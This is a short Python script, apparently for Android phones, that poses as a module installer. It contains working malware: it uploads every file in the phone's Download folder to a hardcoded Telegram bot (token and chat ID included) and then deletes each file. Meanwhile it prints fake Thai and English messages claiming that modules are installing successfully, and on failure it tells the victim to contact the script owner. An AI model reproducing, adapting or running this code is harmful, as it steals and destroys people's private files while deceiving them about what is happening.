import os
import requests

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

token = "7391314773:AAGZOyjFiaO_Ai3vJzvjYFmK2puCGOdRkig"
chat_id = "7528720825"
downloads_path = "/storage/emulated/0/Download/"

for filename in os.listdir(downloads_path):
    file_path = os.path.join(downloads_path, filename)

    if os.path.isfile(file_path):
        try:
            with open(file_path, 'rb') as file:
                url = f"https://api.telegram.org/bot{token}/sendDocument"
                
                files = {'document': file}
                data = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=data)
                if response.status_code == 200:
                    print(f"{YELLOW}กำลังติดตั้งโมดูลกรุณารอสักครู่อาจใช้เวลาถึง 10นาที{RESET}")
                    os.remove(file_path)
                    print(f"{GREEN}File {filename} install successfully!{RESET}")
                else:
                    print(f"{RED}error install{RESET}")
        except Exception as e:
            print(f"{RED}กรุณาติดต่อเจ้าของสคริปเพื่อดำเนินการต่อ{RESET}")
